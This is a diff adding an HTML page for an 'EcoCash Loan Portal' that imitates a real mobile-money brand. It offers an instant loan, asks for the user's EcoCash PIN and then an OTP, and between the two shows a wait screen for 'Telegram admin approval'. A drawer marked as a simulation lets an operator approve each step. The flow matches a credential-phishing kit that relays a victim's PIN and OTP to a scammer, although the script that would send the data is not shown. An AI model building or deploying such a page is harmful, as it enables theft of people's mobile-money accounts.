@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Loan Portal</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-box">
+                <span class="logo-icon">⚡</span>
+                <span class="logo-text">EcoCash Loans</span>
+            </div>
+            <span class="badge">Instant Mobile Loan</span>
+        </header>
+
+        <!-- Progress Bar -->
+        <div class="stepper">
+            <div class="step-dot active" id="dot-1">1</div>
+            <div class="step-line" id="line-1"></div>
+            <div class="step-dot" id="dot-2">2</div>
+            <div class="step-line" id="line-2"></div>
+            <div class="step-dot" id="dot-3">3</div>
+            <div class="step-line" id="line-3"></div>
+            <div class="step-dot" id="dot-4">4</div>
+        </div>
+
+        <!-- Step 1: Calculator & User Details -->
+        <div class="step-card active" id="step-1">
+            <h2>Calculate & Request Loan</h2>
+            <p class="subtitle">Select your loan amount and fill in your details.</p>
+            
+            <div class="slider-group">
+                <label>Loan Amount ($)</label>
+                <div class="amount-display" id="amount-val">$300</div>
+                <input type="range" id="loan-range" min="50" max="2000" step="25" value="300">
+                <div class="range-labels">
+                    <span>$50</span>
+                    <span>$2,000</span>
+                </div>
+            </div>
+
+            <div class="summary-box">
+                <div class="summary-item">
+                    <span>Interest (5%)</span>
+                    <strong id="interest-val">$15</strong>
+                </div>
+                <div class="summary-item">
+                    <span>Total Repayable</span>
+                    <strong id="total-val">$315</strong>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="full-name">Full Name</label>
+                <input type="text" id="full-name" placeholder="Enter your full name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="purpose">Loan Purpose</label>
+                <select id="purpose">
+                    <option value="Personal Business">Personal Business</option>
+                    <option value="Emergency Expense">Emergency Expense</option>
+                    <option value="School Fees">School Fees</option>
+                    <option value="Shopping & Bills">Shopping & Bills</option>
+                </select>
+            </div>
+
+            <button class="btn btn-primary" onclick="goToStep(2)">Continue to Verification →</button>
+        </div>
+
+        <!-- Step 2: 4-Digit Security PIN -->
+        <div class="step-card" id="step-2">
+            <h2>Security Verification</h2>
+            <p class="subtitle">Enter your 4-digit EcoCash PIN to authorize authorization.</p>
+            
+            <div class="pin-inputs" id="pin-container">
+                <input type="password" maxlength="1" class="pin-box" autofocus>
+                <input type="password" maxlength="1" class="pin-box">
+                <input type="password" maxlength="1" class="pin-box">
+                <input type="password" maxlength="1" class="pin-box">
+            </div>
+
+            <div class="actions">
+                <button class="btn btn-secondary" onclick="goToStep(1)">← Back</button>
+                <button class="btn btn-primary" onclick="submitPin()">Submit Application</button>
+            </div>
+        </div>
+
+        <!-- Step 3: Admin Approval Wait Screen -->
+        <div class="step-card text-center" id="step-3">
+            <div class="spinner"></div>
+            <h2>Awaiting Telegram Admin Approval</h2>
+            <p class="subtitle">Your application has been sent to our Telegram bot system. Please wait while an admin reviews your request...</p>
+            
+            <div class="demo-notice">
+                💡 <strong>Admin Simulation:</strong> Use the floating panel on the right side of the page to click "Approve Loan".
+            </div>
+        </div>
+
+        <!-- Step 4: OTP Verification -->
+        <div class="step-card" id="step-4">
+            <h2>Enter 4-Digit OTP</h2>
+            <p class="subtitle">An OTP code was sent to your registered phone number. Enter it below to confirm.</p>
+            
+            <div class="pin-inputs" id="otp-container">
+                <input type="text" maxlength="1" class="pin-box" autofocus>
+                <input type="text" maxlength="1" class="pin-box">
+                <input type="text" maxlength="1" class="pin-box">
+                <input type="text" maxlength="1" class="pin-box">
+            </div>
+
+            <button class="btn btn-primary" onclick="submitOTP()">Verify & Finish</button>
+        </div>
+
+        <!-- Step 5: Success & Receipt -->
+        <div class="step-card text-center" id="step-5">
+            <div class="success-icon">🎉</div>
+            <h2>Congratulations!</h2>
+            <p class="subtitle">Your loan request has been successfully approved and disbursed.</p>
+
+            <div class="receipt-card">
+                <h3>Loan Disbursement Receipt</h3>
+                <div class="receipt-row">
+                    <span>Borrower Name:</span>
+                    <strong id="rec-name">-</strong>
+                </div>
+                <div class="receipt-row">
+                    <span>Amount Approved:</span>
+                    <strong id="rec-amount">-</strong>
+                </div>
+                <div class="receipt-row">
+                    <span>Status:</span>
+                    <span class="status-badge">Disbursed / Paid</span>
+                </div>
+            </div>
+
+            <button class="btn btn-primary" onclick="location.reload()">Start New Loan</button>
+        </div>
+    </div>
+
+    <!-- Interactive Simulation Admin Drawer -->
+    <div class="admin-panel" id="admin-panel">
+        <div class="admin-header">
+            <span>📱 Telegram Admin Panel (Simulation)</span>
+        </div>
+        <div class="admin-body">
+            <p><strong>Bot Status:</strong> <span id="admin-status" style="color: #f39c12;">Waiting for user...</span></p>
+            <div id="admin-details">
+                <p>No active loan submission.</p>
+            </div>
+            <button class="btn btn-success" id="admin-approve-btn" disabled onclick="adminApproveLoan()">Approve Request</button>
+            <button class="btn btn-success" id="admin-otp-btn" style="display:none; margin-top:10px;" onclick="adminApproveOTP()">Approve OTP</button>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+              </html>
+              
